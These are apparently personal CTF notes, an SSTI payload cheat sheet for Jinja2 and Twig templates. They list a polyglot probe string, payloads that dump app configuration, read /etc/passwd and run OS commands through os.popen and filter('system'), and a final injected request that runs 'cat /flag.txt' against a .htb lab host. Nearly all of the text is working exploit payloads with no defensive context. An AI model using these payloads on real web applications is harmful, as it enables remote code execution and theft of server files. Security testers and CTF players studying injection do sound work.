```
${{<%[%'"}}%\.
```

All Payloads are for Jinja2
web application configuration 
```
{{ config.items() }}
```

built in functions 
```
{{ self.__init__.__globals__.__builtins__ }}
```

local file inclusion
```
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

rce

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

TWIG
```
{{ _self }}
```

```
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

```
{{ ['id'] | filter('system') }}
```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md

api=http://truckapi.htb/?id%3D{{['cat\x20/flag.txt']|filter('system')}}